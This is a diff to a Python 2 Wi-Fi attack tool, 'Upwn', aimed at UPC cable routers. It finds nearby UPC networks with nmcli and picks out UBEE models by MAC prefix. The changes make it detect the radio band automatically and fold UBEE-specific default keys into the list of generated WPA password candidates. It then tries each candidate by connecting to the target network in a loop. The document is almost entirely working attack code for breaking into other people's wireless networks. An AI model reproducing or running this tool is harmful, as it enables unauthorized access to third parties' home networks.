@@ -31,7 +31,7 @@ class Upwn(object):
 
         Upwn.checkroot()
         Upwn.banner()
-        aps, macs, ubees = Upwn.getaps()
+        aps, macs, ubees, ghz = Upwn.getaps()
         Upwn.getsetiface()
         listnr = Upwn.setap(aps, macs)
 
@@ -40,10 +40,16 @@ class Upwn(object):
                 isubee = 1
                 print OKGREEN + '[+] ' + "UBEE router detected" + ENDC
 
+        if int(ghz[listnr][:2]) == 24:
+            Upwn.ghz = 1
+            print OKGREEN + '[+] ' + "2.4 Ghz \tdetected" + ENDC
+        else:
+            Upwn.ghz = 2
+            print OKGREEN + '[+] ' + "5 Ghz \tdetected" + ENDC
+
         prefix = Upwn.serials()
 
         ubeekeys = Upwn.gen_keys(listnr, 'UAAP')
-        Upwn.setghz()
         keys = Upwn.gen_keys(listnr, prefix)
 
         print OKGREEN + "\nAvailable keys:" + ENDC
@@ -63,81 +69,37 @@ class Upwn(object):
         Upwn.deadend()
 
     '''
-    DEADEND
+    GET APs
     '''
     @staticmethod
-    def deadend():
-        Upwn.allkeys = 0
-        Upwn.whatyearisit = 0
+    def getaps():
+        aps = []
+        macs = []
+        ubees = []
+        ghz = []
+        cnt = 0
 
-        Upwn.fail()
-        response = raw_input(WARNING + "\nRetry? (Y/n): " + ENDC)
+        nmcli = subprocess.check_output(["nmcli", "-f", "SSID,BSSID,FREQ", "d", "wifi"], stderr=open(os.devnull, 'w'))
+        aps_macs_ghz = re.compile('(UPC+\d{7}).+(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w).+(\d{4})').findall(nmcli)
+        aps_macs_ghz = set(aps_macs_ghz)
 
-        if response in 'Yy' or '':
-            Upwn.menu()
-        else:
-            exit(0)
+        for item in aps_macs_ghz:
+            aps.append(item[0])
+            macs.append(item[1])
+            ghz.append(item[2])
+            if item[1][:8] == '64:7C:34':
+                ubees.append(cnt)
+            cnt += 1
 
-    '''
-    SET GHZ
-    '''
-    @staticmethod
-    def setghz():
-        print OKGREEN + "\nAvailable band options:" + ENDC
-        print "[0] 2.4 Ghz (default)"
-        print "[1] 5 Ghz"
-        print "[2] Both (may take a while)"
-
-        response = raw_input(WARNING + "\nselect band: " + ENDC)
-
-        if response == '':
-            Upwn.ghz = 1
-            print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
-        elif int(response) == 0:
-            Upwn.ghz = 1
-            print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
-        elif int(response) == 1:
-            Upwn.ghz = 2
-            print OKGREEN + "[+] " + ENDC + "5 Ghz selected\n"
-        elif int(response) == 2:
-            Upwn.ghz = 3
-            print OKGREEN + "[+] " + ENDC + "2.4 + 5 Ghz selected\n"
-        else:
-            print "Your answer was bad and you should feel bad"
+        # exit if no UPC router is found
+        if not aps:
+            print FAIL + "[!] No vulnerable UPC routers found!" + ENDC
+            print FAIL + "[+] Are you sure there are UPC routers around?" + ENDC
+            print FAIL + "[+] If yes, try turning your WIFI off and on again." + ENDC
+            print FAIL + "[+] Also try using a better Wifi dongle if the problem persists.\n" + ENDC
             exit(1)
 
-    '''
-    SET AP
-    '''
-    @staticmethod
-    def setap(aps, macs):
-        print OKGREEN + "\nAvailable UPC routers:" + ENDC
-        i = 0
-        for item in aps:
-            Upwn.ap_list.append(item)
-            if i == 0:
-                print "[" + str(i) + "] " + str(item) + " (default)"
-            else:
-                print "[" + str(i) + "] " + str(item)
-            Upwn.cntaps += 1
-            i += 1
-
-        for item in macs:
-            Upwn.mac_list.append(item)
-
-        listnr = 0
-        response = raw_input(WARNING + "\nselect router: " + ENDC)
-
-        if response == '':
-            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
-        elif int(response) <= Upwn.cntaps:
-            listnr = int(response)
-            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
-        else:
-            print "Your answer was bad and you should feel bad"
-            exit(1)
-
-        return listnr
+        return aps, macs, ubees, ghz
 
     '''
     SET WIFI INTERFACE
@@ -173,55 +135,37 @@ class Upwn(object):
         print OKGREEN + "[+]" + ENDC + " testing via " + str(Upwn.wifi_interface) + "\n"
 
     '''
-    GET APs
+    SET AP
     '''
     @staticmethod
-    def getaps():
-        nmcli = subprocess.check_output(["nmcli", "-f", "SSID,BSSID", "d", "wifi"], stderr=open(os.devnull, 'w'))
-        aps_macs = re.compile('(UPC+\d{7}).+(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)').findall(nmcli)
+    def setap(aps, macs):
+        print OKGREEN + "\nAvailable UPC routers:" + ENDC
+        i = 0
+        for item in aps:
+            Upwn.ap_list.append(item)
+            if i == 0:
+                print "[" + str(i) + "] " + str(item) + " (default)"
+            else:
+                print "[" + str(i) + "] " + str(item)
+            Upwn.cntaps += 1
+            i += 1
 
-        aps_macs = set(aps_macs)
+        for item in macs:
+            Upwn.mac_list.append(item)
 
-        aps = []
-        macs = []
-        ubees = []
-        cnt = 0
-        for item in aps_macs:
-            aps.append(item[0])
-            macs.append(item[1])
-            if item[1][:8] == '64:7C:34':
-                ubees.append(cnt)
-            cnt += 1
+        listnr = 0
+        response = raw_input(WARNING + "\nselect router: " + ENDC)
 
-        # exit if no UPC router is found
-        if not aps:
-            print FAIL + "[!] No vulnerable UPC routers found!" + ENDC
-            print FAIL + "[+] Are you sure there are UPC routers around?" + ENDC
-            print FAIL + "[+] If yes, try turning your WIFI off and on again." + ENDC
-            print FAIL + "[+] Also try using a better Wifi dongle if the problem persists.\n" + ENDC
+        if response == '':
+            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
+        elif int(response) <= Upwn.cntaps:
+            listnr = int(response)
+            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
+        else:
+            print "Your answer was bad and you should feel bad"
             exit(1)
 
-        return aps, macs, ubees
-
-    '''
-    TEST THE KEYS?
-    '''
-    @staticmethod
-    def pretest(listnr, keys, ubeekeys):
-        response = raw_input(WARNING + "\nTry " + str(Upwn.allkeys) + " keys now? [" + Upwn.ap_list[listnr] +
-                             "] (Y/n): " + ENDC)
-
-        if response in 'Yy' or '':
-
-            if keys and ubeekeys:
-                Upwn.keytest(listnr, ubeekeys, Upwn.wifi_interface)
-                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
-            elif ubeekeys:
-                Upwn.keytest(listnr, ubeekeys, Upwn.wifi_interface)
-            else:
-                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
-        else:
-            exit(0)
+        return listnr
 
     '''
     SET PREFIX
@@ -261,39 +205,6 @@ class Upwn(object):
             exit(1)
 
         return prefix
-
-    '''
-    NMCLI MAGIC
-    '''
-    @staticmethod
-    def keytest(aplistnr, key, interface):
-        cnt = 0
-        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
-                         stderr=open(os.devnull, 'wb'))
-
-        for item in key:
-            cnt += 1
-            start_time = time.time()
-            sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
-            sleep(2)
-
-            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item,
-                                  'iface', interface], stderr=open(os.devnull, 'wb'))
-            streamdata = p.communicate()[0]
-
-            Upwn.waiter(5)
-
-            if p.returncode == 0:
-                Upwn.whatyearisit += (time.time() - start_time)
-                Upwn.win(aplistnr, item)
-
-            sys.stdout.write(FAIL + "[X]" + ENDC)
-            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
-                             stderr=open(os.devnull, 'wb'))
-
-            Upwn.whatyearisit += (time.time() - start_time)
-            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(Upwn.allkeys) + "]")
-        print
 
     '''
     GET KEYS
@@ -352,6 +263,72 @@ class Upwn(object):
                 if parts[2] == str(Upwn.ghz):
                     collect.append(parts[1])
         return collect
+
+    '''
+    TEST THE KEYS?
+    '''
+    @staticmethod
+    def pretest(listnr, keys, ubeekeys):
+        response = raw_input(WARNING + "\nTry " + str(Upwn.allkeys) + " keys now? [" + Upwn.ap_list[listnr] +
+                             "] (Y/n): " + ENDC)
+
+        if response in 'Yy' or '':
+            if keys and ubeekeys:
+                keys.insert(0, ubeekeys[0])
+                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
+            else:
+                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
+        else:
+            exit(0)
+
+    '''
+    NMCLI MAGIC
+    '''
+    @staticmethod
+    def keytest(aplistnr, key, interface):
+        cnt = 0
+        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
+                         stderr=open(os.devnull, 'wb'))
+
+        for item in key:
+            cnt += 1
+            start_time = time.time()
+            sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
+            sleep(2)
+
+            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item,
+                                  'iface', interface], stderr=open(os.devnull, 'wb'))
+            streamdata = p.communicate()[0]
+
+            Upwn.waiter(5)
+
+            if p.returncode == 0:
+                Upwn.whatyearisit += (time.time() - start_time)
+                Upwn.win(aplistnr, item)
+
+            sys.stdout.write(FAIL + "[X]" + ENDC)
+            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
+                             stderr=open(os.devnull, 'wb'))
+
+            Upwn.whatyearisit += (time.time() - start_time)
+            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(Upwn.allkeys) + "]")
+        print
+
+    '''
+    DEADEND
+    '''
+    @staticmethod
+    def deadend():
+        Upwn.allkeys = 0
+        Upwn.whatyearisit = 0
+
+        Upwn.fail()
+        response = raw_input(WARNING + "\nRetry? (Y/n): " + ENDC)
+
+        if response in 'Yy' or '':
+            Upwn.menu()
+        else:
+            exit(0)
 
     '''
     WAIT FOR IT.. now with dots
